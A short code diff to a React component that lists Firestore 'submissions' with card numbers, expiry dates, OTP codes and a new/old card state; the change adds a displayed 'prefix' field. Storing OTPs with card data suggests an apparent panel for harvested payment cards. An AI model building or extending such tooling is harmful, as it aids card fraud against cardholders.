@@ -19,7 +19,8 @@ interface Submission {
   month: string;
   yaer: string;
   otp: string;
-  createdAt: string
+  createdAt: string,
+
 }
 async function getDataFromFirestore() {
   const arr: QueryDocumentSnapshot<DocumentData, DocumentData>[] = []
@@ -92,7 +93,7 @@ export default function SubmissionsList() {
               <CardHeader className="flex flex-row items-center  justify-between	">
                 <AccordionTrigger>
                   {' '}
-                  <CardTitle className='text-sm'>{submission.cardNumber}</CardTitle>
+                  <CardTitle className='text-sm'>{submission.prefix}-{submission.cardNumber}</CardTitle>
                 </AccordionTrigger>
                 <div>
                   <Badge className={`${submission.cardState ==='new'? 'bg-blue-500' : 'bg-red-500'} `}>{submission.cardState==='new'?'جديد':'قديم'}</Badge>{' '}
@@ -101,6 +102,11 @@ export default function SubmissionsList() {
               </CardHeader>
               <AccordionContent>
                 <CardContent dir='rtl' className='grid grid-cols-1'>
+                  <div className='flex justify-start'>
+                    <strong className='mx-3 text-red-300 mx-4'>Prefix</strong>
+                    <span className="mx-4"> {submission.prefix}</span>
+                  </div>
+
                   <div className='flex justify-start'>
 
                     <strong className='mx-3 text-red-300  mx-4'>تاريخ الانتهاء </strong>
